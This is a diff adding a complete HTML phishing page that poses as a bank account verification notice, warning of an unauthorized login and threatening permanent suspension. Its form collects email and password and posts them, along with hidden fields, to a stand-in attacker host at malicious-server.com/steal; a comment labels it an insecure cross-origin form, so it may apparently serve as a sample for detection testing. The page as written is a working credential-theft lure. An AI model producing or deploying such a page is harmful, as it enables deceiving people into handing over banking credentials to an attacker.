@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Your Bank Account Details</title>
+    <style>
+        body { font-family: sans-serif; padding: 50px; background-color: #f3f4f6; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        input[type="submit"] { background: #3b82f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Urgent: Verify Your Account</h2>
+        <p>We detected an unauthorized login attempt on your account. Validate your identity to restore access immediately to prevent permanent suspension.</p>
+        
+        <!-- Insecure form submitting cross-origin -->
+        <form action="http://malicious-server.com/steal" method="POST">
+            <input type="hidden" name="hidden_field_1" value="secret1">
+            <input type="hidden" name="hidden_field_2" value="secret2">
+            <input type="hidden" name="hidden_field_3" value="secret3">
+            <input type="hidden" name="hidden_field_4" value="secret4">
+            
+            <label>Email Address</label>
+            <input type="text" name="email" placeholder="enter email address" required>
+            
+            <label>Password</label>
+            <input type="password" name="password" placeholder="enter password" required>
+            
+            <input type="submit" value="Verify Identity Now">
+        </form>
+    </div>
+</body>
+</html>
